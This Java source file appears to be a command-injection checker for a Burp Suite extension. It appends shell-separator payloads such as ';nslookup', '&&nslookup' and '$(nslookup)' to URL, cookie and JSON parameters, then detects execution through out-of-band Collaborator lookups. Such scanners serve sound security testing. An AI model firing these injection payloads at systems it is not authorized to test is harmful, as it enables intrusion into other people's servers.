package whoami.checkers;

import burp.api.montoya.core.Annotations;
import burp.api.montoya.core.HighlightColor;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.Interaction;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import whoami.core.CoreModules;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CMDInjectionChecker {
    private final CoreModules core;
    private final ObjectMapper objectMapper;
    private static final String[] COMMAND_INJECTION_PAYLOADS = {
        "nslookup %s",
        ";nslookup %s",
        "&nslookup %s",
        "&&nslookup %s",
        "|nslookup %s",
        "`nslookup %s`",
        "$(nslookup %s)",
        "||nslookup %s"
    };

    public CMDInjectionChecker(CoreModules core) {
        this.core = core;
        this.objectMapper = new ObjectMapper();
    }

    // Metadata class to store client, parameter, payload, and response
    private static class PayloadMetadata {
        final CollaboratorClient client;
        final String parameter;
        final String payload;
        final HttpRequestResponse response;

        PayloadMetadata(CollaboratorClient client, String parameter, String payload, HttpRequestResponse response) {
            this.client = client;
            this.parameter = parameter;
            this.payload = payload;
            this.response = response;
        }
    }

    public void checkForCMDi(HttpRequest request, Set<String> parametersToScan) {
        checkForCMDi(request, false, parametersToScan);
    }

    private void checkForCMDi(HttpRequest request, boolean bypassDelay, Set<String> parametersToScan) {
        String url = request.url().toString();
        String method = request.method();
        core.logger.log("CMDi", "Starting Command Injection testing for URL: " + url + ", Method: " + method + ", Bypass Delay: " + bypassDelay + ", Parameters to scan: " + parametersToScan);

        // Handle standard parameters
        boolean hasStandardParameters = false;
        List<PayloadMetadata> metadataList = new ArrayList<>();
        for (HttpParameter parameter : request.parameters()) {
            if (parameter.type() == HttpParameterType.JSON) {
                core.logger.log("CMDi", "Skipping JSON parameter: " + parameter.name());
                continue;
            }
            if (parameter.type() == HttpParameterType.COOKIE && !core.uiManager.getConfig().isTestCookies()) {
                core.logger.log("CMDi", "Skipping COOKIE parameter due to toggle: " + parameter.name());
                continue;
            }
            if (!parametersToScan.isEmpty() && !parametersToScan.contains(parameter.name())) {
                core.logger.log("CMDi", "Skipping parameter not in target list: " + parameter.name());
                continue;
            }
            hasStandardParameters = true;

            String name = parameter.name();
            String value = parameter.value();
            HttpParameterType type = parameter.type();

            for (String payloadTemplate : COMMAND_INJECTION_PAYLOADS) {
                // Create new Collaborator client and payload
                CollaboratorClient client = core.getApi().collaborator().createClient();
                String uniqueCollaboratorPayload = client.generatePayload().toString();
                String payload = String.format(payloadTemplate, uniqueCollaboratorPayload);
                String encodedPayload = core.getApi().utilities().urlUtils().encode(payload);
                HttpParameter paramWithPayload = HttpParameter.parameter(name, value + encodedPayload, type);
                HttpRequest req = request.withUpdatedParameters(paramWithPayload);
                core.logger.log("CMDi", "Sending encoded payload for parameter: " + name + ", Payload: " + payload + ", Collaborator: " + uniqueCollaboratorPayload);
                HttpRequestResponse resp = core.requestSender.sendRequest(req, "", false, bypassDelay);
                metadataList.add(new PayloadMetadata(client, name, payload, resp));

                // Check for 500 Internal Server Error
                if (resp.response() != null && resp.response().statusCode() == 500) {
                    core.logger.log("CMDi", "[ERROR] 500 Internal Server Error detected for parameter: " + name + " with payload: " + payload);
                    Annotations annotations = Annotations.annotations()
                            .withHighlightColor(HighlightColor.ORANGE)
                            .withNotes("500 Internal Server Error detected in parameter: " + name + "\n" +
                                       "Payload: " + payload + "\n" +
                                       "Encoded Payload: " + encodedPayload + "\n" +
                                       "This may indicate a potential issue but is not a confirmed vulnerability.");
                    core.getApi().siteMap().add(resp.withAnnotations(annotations));
                }
            }
        }

        // Wait for potential Collaborator interactions (5 seconds)
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            core.logger.logError("CMDi", "Interrupted while waiting for Collaborator interactions: " + e.getMessage());
        }

        // Check for interactions in each client
        for (PayloadMetadata metadata : metadataList) {
            List<Interaction> interactions = metadata.client.getAllInteractions();
            if (!interactions.isEmpty()) {
                core.logger.log("CMDi", "[VULNERABLE] Command Injection found for parameter: " + metadata.parameter + " with payload: " + metadata.payload);
                Annotations annotations = Annotations.annotations()
                        .withHighlightColor(HighlightColor.RED)
                        .withNotes("Command Injection found in parameter: " + metadata.parameter + "\n" +
                                   "Payload: " + metadata.payload + "\n" +
                                   "Encoded Payload: " + core.getApi().utilities().urlUtils().encode(metadata.payload) + "\n" +
                                   "Collaborator interaction detected, indicating command execution.\n" +
                                   "Interaction details: " + interactions.get(0).type().toString());
                core.getApi().siteMap().add(metadata.response.withAnnotations(annotations));
            }
        }

        if (!hasStandardParameters) {
            core.logger.log("CMDi", "No standard parameters found to test");
        }

        // Handle JSON parameters for POST/PUT
        if (method.equalsIgnoreCase("POST") || method.equalsIgnoreCase("PUT")) {
            String contentType = request.headerValue("Content-Type");
            if (contentType != null && contentType.toLowerCase().contains("application/json")) {
                core.logger.log("CMDi", "Detected JSON request");
                String body = request.bodyToString();
                if (body.isEmpty()) {
                    core.logger.log("CMDi", "Empty JSON body, skipping JSON testing");
                } else {
                    try {
                        com.fasterxml.jackson.databind.JsonNode root = objectMapper.readTree(body);
                        processJsonNode(root, "", url, request, bypassDelay, parametersToScan);
                    } catch (IOException e) {
                        core.logger.logError("CMDi", "Failed to parse JSON body: " + e.getMessage());
                    }
                }
            } else {
                core.logger.log("CMDi", "Non-JSON Content-Type, skipping JSON testing");
            }
        }

        core.logger.log("CMDi", "Completed Command Injection testing for URL: " + url);
    }

    public void runContextMenuCmdiTest(HttpRequestResponse requestResponse) {
        core.logger.log("CONTEXT", "=== Starting Command Injection Test from context menu ===");
        try {
            if (requestResponse == null || requestResponse.request() == null) {
                core.logger.logError("CONTEXT", "RequestResponse or Request is null");
                return;
            }

            HttpRequest request = requestResponse.request();
            String url = request.url();
            String method = request.method();

            core.logger.log("CONTEXT", "URL: " + url + ", Method: " + method);
            core.logger.log("CONTEXT", "Parameters: " + request.parameters().size());
            core.logger.log("CONTEXT", "Bypassing all filters: Enabled=" + core.uiManager.getConfig().isEnabled() +
                    ", CMDi Toggle=" + core.uiManager.getConfig().getCheckers().getOrDefault("CMDi", false) +
                    ", Cookie Testing=" + core.uiManager.getConfig().isTestCookies() +
                    ", Excluded Extensions=" + core.uiManager.getConfig().getExcludedExtensions() +
                    ", Method Allowed=" + core.uiManager.getConfig().isMethodAllowed(method) +
                    ", Delay=" + core.uiManager.getConfig().getDelayMillis() + "ms");

            // Temporarily override settings for context menu test
            boolean originalCookieTesting = core.uiManager.getConfig().isTestCookies();
            core.uiManager.getConfig().setTestCookies(true);
            boolean originalCmdiToggle = core.uiManager.getConfig().getCheckers().getOrDefault("CMDi", false);
            core.uiManager.getConfig().getCheckers().put("CMDi", true);

            // Run CMDi test with delay bypassed, scanning all parameters
            checkForCMDi(request, true, Set.of());

            // Restore original settings
            core.uiManager.getConfig().setTestCookies(originalCookieTesting);
            core.uiManager.getConfig().getCheckers().put("CMDi", originalCmdiToggle);

            core.logger.log("CONTEXT", "=== Completed Command Injection Test ===");
        } catch (Exception e) {
            core.logger.logError("CONTEXT", "Error in context menu CMDi test: " + e.getMessage());
        }
    }

    private void processJsonNode(com.fasterxml.jackson.databind.JsonNode node, String path, String url, HttpRequest originalRequest, boolean bypassDelay, Set<String> parametersToScan) {
        core.logger.log("JSON", "Processing node at path: " + (path.isEmpty() ? "<root>" : path));
        if (node.isObject()) {
            ObjectNode objectNode = (ObjectNode) node;
            core.logger.log("JSON", "Found JSONObject with keys: " + objectNode.fieldNames().toString());
            objectNode.fields().forEachRemaining(entry -> {
                String key = entry.getKey();
                String newPath = path.isEmpty() ? key : path + "." + key;
                core.logger.log("JSON", "Processing key: " + key + " at path: " + newPath);
                processJsonNode(entry.getValue(), newPath, url, originalRequest, bypassDelay, parametersToScan);
            });
        } else if (node.isArray()) {
            ArrayNode arrayNode = (ArrayNode) node;
            core.logger.log("JSON", "Found JSONArray with length: " + arrayNode.size());
            if (arrayNode.size() == 0 && (parametersToScan.isEmpty() || parametersToScan.contains(path + "[0]"))) {
                core.logger.log("JSON", "Found empty array at: " + path + ", testing index [0]");
                testJsonPath(path + "[0]", url, originalRequest, bypassDelay, parametersToScan);
            } else {
                for (int i = 0; i < arrayNode.size(); i++) {
                    String newPath = path + "[" + i + "]";
                    core.logger.log("JSON", "Processing array index: " + i + " at path: " + newPath);
                    processJsonNode(arrayNode.get(i), newPath, url, originalRequest, bypassDelay, parametersToScan);
                }
            }
        } else {
            String stringValue = node.isNull() ? "null" : node.asText();
            core.logger.log("JSON", "Found leaf node at path: " + path + ", value: " + stringValue);
            if (parametersToScan.isEmpty() || parametersToScan.contains(path)) {
                testJsonPath(path, url, originalRequest, bypassDelay, parametersToScan, stringValue);
            } else {
                core.logger.log("JSON", "Skipping leaf node at path: " + path + " (not in parametersToScan)");
            }
        }
    }

    private void testJsonPath(String path, String url, HttpRequest originalRequest, boolean bypassDelay, Set<String> parametersToScan, String... stringValue) {
        String value = stringValue.length > 0 ? stringValue[0] : "";
        com.fasterxml.jackson.databind.JsonNode modifiedRoot;
        String originalBody = originalRequest.bodyToString();
        try {
            modifiedRoot = objectMapper.readTree(originalBody);
        } catch (IOException e) {
            core.logger.logError("JSON", "Failed to parse body as JSON for path: " + path + ", error: " + e.getMessage());
            return;
        }

        List<PayloadMetadata> metadataList = new ArrayList<>();
        for (String payloadTemplate : COMMAND_INJECTION_PAYLOADS) {
            // Create new Collaborator client and payload
            CollaboratorClient client = core.getApi().collaborator().createClient();
            String uniqueCollaboratorPayload = client.generatePayload().toString();
            String payload = String.format(payloadTemplate, uniqueCollaboratorPayload);
            com.fasterxml.jackson.databind.JsonNode newRoot;
            try {
                newRoot = objectMapper.readTree(originalBody);
            } catch (IOException e) {
                core.logger.logError("JSON", "Failed to parse body as JSON for path: " + path + ", error: " + e.getMessage());
                continue;
            }
            if (setJsonValue(newRoot, path, value + payload)) {
                try {
                    String newBody = objectMapper.writeValueAsString(newRoot);
                    HttpRequest req = originalRequest.withBody(newBody);
                    core.logger.log("JSON", "Sending raw CMDi payload for: " + path + ", Payload: " + payload + ", Collaborator: " + uniqueCollaboratorPayload);
                    HttpRequestResponse resp = core.requestSender.sendRequest(req, "", false, bypassDelay);
                    metadataList.add(new PayloadMetadata(client, path, payload, resp));

                    // Check for 500 Internal Server Error
                    if (resp.response() != null && resp.response().statusCode() == 500) {
                        core.logger.log("JSON", "[ERROR] 500 Internal Server Error detected for JSON parameter: " + path + " with payload: " + payload);
                        Annotations annotations = Annotations.annotations()
                                .withHighlightColor(HighlightColor.ORANGE)
                                .withNotes("500 Internal Server Error detected in JSON parameter: " + path + "\n" +
                                           "Payload: " + payload + "\n" +
                                           "This may indicate a potential issue but is not a confirmed vulnerability.");
                        core.getApi().siteMap().add(resp.withAnnotations(annotations));
                    }
                } catch (IOException e) {
                    core.logger.logError("JSON", "Failed to serialize JSON for path: " + path + ", error: " + e.getMessage());
                }
            }
        }

        // Wait for potential Collaborator interactions (5 seconds)
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            core.logger.logError("JSON", "Interrupted while waiting for Collaborator interactions: " + e.getMessage());
        }

        // Check for interactions in each client
        for (PayloadMetadata metadata : metadataList) {
            List<Interaction> interactions = metadata.client.getAllInteractions();
            if (!interactions.isEmpty()) {
                core.logger.log("JSON", "[VULNERABLE] Command Injection found for JSON parameter: " + metadata.parameter + " with payload: " + metadata.payload);
                Annotations annotations = Annotations.annotations()
                        .withHighlightColor(HighlightColor.RED)
                        .withNotes("Command Injection found in JSON parameter: " + metadata.parameter + "\n" +
                                   "Payload: " + metadata.payload + "\n" +
                                   "Collaborator interaction detected, indicating command execution.\n" +
                                   "Interaction details: " + interactions.get(0).type().toString());
                core.getApi().siteMap().add(metadata.response.withAnnotations(annotations));
            }
        }
    }

    private boolean setJsonValue(com.fasterxml.jackson.databind.JsonNode root, String path, String value) {
        core.logger.log("JSON", "Setting value at: " + path + " to: " + value);
        try {
            List<String> parts = new ArrayList<>();
            Matcher matcher = Pattern.compile("\\w+|\\d+").matcher(path.replaceAll("\\.", " ").replaceAll("\\[", " ").replaceAll("\\]", ""));
            while (matcher.find()) {
                parts.add(matcher.group());
            }

            com.fasterxml.jackson.databind.JsonNode current = root;
            for (int i = 0; i < parts.size() - 1; i++) {
                String part = parts.get(i);
                if (current.isObject()) {
                    ObjectNode currentObj = (ObjectNode) current;
                    if (!currentObj.has(part)) {
                        currentObj.set(part, objectMapper.createObjectNode());
                    }
                    current = currentObj.get(part);
                } else if (current.isArray()) {
                    int index = Integer.parseInt(part);
                    ArrayNode currentArray = (ArrayNode) current;
                    while (currentArray.size() <= index) {
                        currentArray.addNull();
                    }
                    if (currentArray.get(index).isNull()) {
                        currentArray.set(index, objectMapper.createObjectNode());
                    }
                    current = currentArray.get(index);
                } else {
                    core.logger.logError("JSON", "Invalid structure at: " + path + ", found: " + current.getNodeType());
                    return false;
                }
            }

            String lastPart = parts.get(parts.size() - 1);
            if (current.isObject()) {
                ((ObjectNode) current).put(lastPart, value);
            } else if (current.isArray()) {
                int index = Integer.parseInt(lastPart);
                ArrayNode currentArray = (ArrayNode) current;
                while (currentArray.size() <= index) {
                    currentArray.addNull();
                }
                currentArray.set(index, objectMapper.valueToTree(value));
            } else {
                core.logger.logError("JSON", "Invalid structure at: " + path + ", found: " + current.getNodeType());
                return false;
            }
            return true;
        } catch (Exception e) {
            core.logger.logError("JSON", "Failed to set value at: " + path + ", error: " + e.getMessage());
            return false;
        }
    }
}
